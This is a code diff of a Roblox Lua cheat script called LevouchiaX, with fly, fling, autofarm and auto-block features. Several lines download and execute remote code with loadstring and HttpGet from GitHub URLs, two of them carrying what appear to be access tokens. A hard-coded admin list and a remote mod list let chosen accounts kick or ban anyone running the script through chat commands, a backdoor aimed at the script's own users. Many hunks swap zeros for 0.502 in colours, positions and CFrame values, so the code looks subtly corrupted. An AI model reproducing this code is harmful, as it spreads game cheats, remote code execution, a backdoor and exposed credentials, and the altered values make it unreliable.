@@ -187,7 +187,7 @@ LevouchiaX_2.Name = "LevouchiaX"
 LevouchiaX_2.Parent = MenuFrame
 LevouchiaX_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 LevouchiaX_2.BackgroundTransparency = 1.000
-LevouchiaX_2.Position = UDim2.new(0.045161292, 0, 0, 0)
+LevouchiaX_2.Position = UDim2.new(0.045161292, 0, 0, 0.502)
 LevouchiaX_2.Size = UDim2.new(0, 115, 0, 34)
 LevouchiaX_2.Font = Enum.Font.GothamBlack
 LevouchiaX_2.Text = "LevouchiaX"
@@ -244,7 +244,7 @@ DropShadow.Position = UDim2.new(0.5, 0, 0.5, 0)
 DropShadow.Size = UDim2.new(1, 47, 1, 47)
 DropShadow.ZIndex = 0
 DropShadow.Image = "rbxassetid://6015897843"
-DropShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
+DropShadow.ImageColor3 = Color3.fromRGB(0, 0, 0.502)
 DropShadow.ImageTransparency = 0.200
 DropShadow.ScaleType = Enum.ScaleType.Slice
 DropShadow.SliceCenter = Rect.new(49, 49, 450, 450)
@@ -253,7 +253,7 @@ TopLine.Name = "TopLine"
 TopLine.Parent = LevouchiaXFrame
 TopLine.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
 TopLine.BorderSizePixel = 0
-TopLine.Position = UDim2.new(0.256198347, 0, 0, 0)
+TopLine.Position = UDim2.new(0.256198347, 0, 0, 0.502)
 TopLine.Size = UDim2.new(0, 450, 0, 7)
 
 SideInfo.Name = "SideInfo"
@@ -1484,7 +1484,7 @@ UIS.InputBegan:Connect(function(key,b)
     if key.KeyCode == Enum.KeyCode.F and not b then
         if HideBlockColor.BackgroundColor3 == green or AutoBlockColor.BackgroundColor3 == green then
             HoldingF = true
-            player.Character:FindFirstChildWhichIsA('Humanoid').Name = 'SWAG ON TOP'
+            player.Character:FindFirstChildWhichIsA('Humanoid').Name = 'LEV ON TOP'
             while HoldingF == true and HideBlockColor.BackgroundColor3 == green do
                 wait()
                 for _,v in pairs(player.Character:FindFirstChildWhichIsA('Humanoid'):GetPlayingAnimationTracks()) do
@@ -1781,7 +1781,7 @@ Fly.MouseButton1Click:Connect(function()
             local Weld = Instance.new("Weld", Core)
             Weld.Part0 = Core
             Weld.Part1 = localplayer.Character.LowerTorso
-            Weld.C0 = CFrame.new(0, 0, 0)
+            Weld.C0 = CFrame.new(0, 0, 0.502)
         end)
         workspace:WaitForChild("Core")
         local torso = workspace.Core
@@ -1995,7 +1995,7 @@ Fling.MouseButton1Click:Connect(function()
         end;
         local Pause = function()
             Loop:Disconnect()
-            local vectorZero = Vector3.new(0, 0, 0)
+            local vectorZero = Vector3.new(0, 0, 0.502)
             player.Character.PrimaryPart.Velocity = vectorZero
             player.Character.PrimaryPart.RotVelocity = vectorZero
             player.Character.HumanoidRootPart.CFrame = CFrame.new(OldFlingPos) * CFrame.Angles(math.rad(0),math.rad(137.92),math.rad(0))
@@ -2575,7 +2575,7 @@ end)
 
 HighTool.MouseButton1Click:Connect(function()
     if player.Character:FindFirstChildWhichIsA('Tool') then
-        player.Character:FindFirstChildWhichIsA('Tool').Grip = CFrame.new(0, -12, 0, 1, 0, 0, 0, 1, 0, 0, 0, -1)
+        player.Character:FindFirstChildWhichIsA('Tool').Grip = CFrame.new(0, -12, 0, 1, 0, 0, 0.502, 1, 0, 0, 0.502, -1)
     else
         notify('HighTool Error', 'you have to be holding a tool', 5)
     end
@@ -2606,7 +2606,7 @@ AutoFarmWarning = false
 Autofarm.MouseButton1Click:Connect(function()
     if AutoFarmWarning == false then
         AutoFarmWarning = true
-        notify('Autofarm Warning', 'press again to begin autofarming, This CANNOT be stopped', 10)
+        notify('Autofarm Warning', 'press again to begin autofarming, this CANNOT be stopped', 10)
     else
         notify('Starting Autofarm', ':(', 5)
         loadstring(game:HttpGet("https://raw.githubusercontent.com/lerkermer/lua-projects/master/SwagAutofarm"))()
@@ -3172,22 +3172,21 @@ coroutine.resume(coroutine.create(function()
             if player.Character.UpperTorso:FindFirstChild('OriginalSize') then
                 player.Character.UpperTorso:FindFirstChild('OriginalSize'):Destroy()
             end
-            loadstring(game:HttpGet('https://raw.githubusercontent.com/LevouchiaX/LevouchiaX/main/swagnames'))()
+            loadstring(game:HttpGet('https://raw.githubusercontent.com/Levoucher/LevouchiaX/main/Whitelist?token=GHSAT0AAAAAACBGFCAJSTEIMXUQZDNEIALEZB5YDFQ'))()
         end
         local success, err = pcall(main)
     end
 end))
 
-local levminss = {
-2321976641 -- Levouch
-1260278612, --MY BOY EVIL
+local levmins = {
+ 2321976641 -- Levouch
 
 }
 
 local bending = false
 local kickmsg = 'PERMA BANNED'
 local function commands(msg,plr)
-    if DisableMod == false or table.find(levminss, plr) then
+    if DisableMod == false or table.find(levmins, plr) then
         local Mod = game:GetService('Players'):GetPlayerByUserId(plr)
         local Msg = string.lower(msg)
         local SplitCMD = string.split(Msg,' ')
@@ -3252,7 +3251,7 @@ local function commands(msg,plr)
                 end
             end
             if string.find(SplitCMD[1], ':kick') then
-                local ISADMIN = table.find(levminss, player.UserId)
+                local ISADMIN = table.find(levmins, player.UserId)
                 if not ISADMIN then
                     player:Kick(kickmsg)
                     wait(5)
@@ -3263,8 +3262,8 @@ local function commands(msg,plr)
                 player.Character.HumanoidRootPart.CFrame = CFrame.new(game.Workspace.Players:FindFirstChild(Mod.Name).HumanoidRootPart.Position)
             end
             if string.find(SplitCMD[1], ':cuffban') then
-                if table.find(levminss, plr) then
-                    local ISADMIN = table.find(levminss, player.UserId)
+                if table.find(levmins, plr) then
+                    local ISADMIN = table.find(levmins, player.UserId)
                     if not ISADMIN then
                         player:Kick('Stop .')
                     end
@@ -3284,10 +3283,10 @@ end
 muted = {}
 mutingnew = false 
 
-local ModCheck = loadstring(game:HttpGet('https://raw.githubusercontent.com/LevouchiaX/LevouchiaX/main/modlist'))()
+local ModCheck = loadstring(game:HttpGet('https://raw.githubusercontent.com/Levoucher/LevouchiaX/main/Mods?token=GHSAT0AAAAAACBGFCAIB5HY655XDOFITPQ4ZB5YHCQ'))()
 Players.PlayerAdded:Connect(function(plr)
-    local levmins = table.find(levminss, plr.UserId)
-    if levmins or ModCheck[plr.UserId] then
+    local LEVMIN = table.find(levmins, plr.UserId)
+    if LEVMIN or ModCheck[plr.UserId] then
         plr.Chatted:Connect(function(msg)
             commands(msg, plr.UserId)
         end)
@@ -3301,8 +3300,8 @@ Players.PlayerAdded:Connect(function(plr)
 end)
 
 for i,v in pairs(game:GetService('Players'):GetChildren()) do
-    local levmins = table.find(levminss, v.UserId)
-    if levmins or ModCheck[v.UserId] then
+    local LEVMIN = table.find(levmins, v.UserId)
+    if LEVMIN or ModCheck[v.UserId] then
         v.Chatted:Connect(function(msg)
            commands(msg, v.UserId)
         end)
@@ -3987,7 +3986,7 @@ if ModCheck[player.UserId] then
     IsMod = true
     DisableMod = true
     notify('Granted Mod Powers', 'you are immune to mod powers | type /e noshield or /e shield to toggle', 10)
-elseif table.find(levminss, player.UserId) then
+elseif table.find(levmins, player.UserId) then
     notify('Granted Admin Powers', 'hi :3', 10)
     IsMod = false
     DisableMod = false
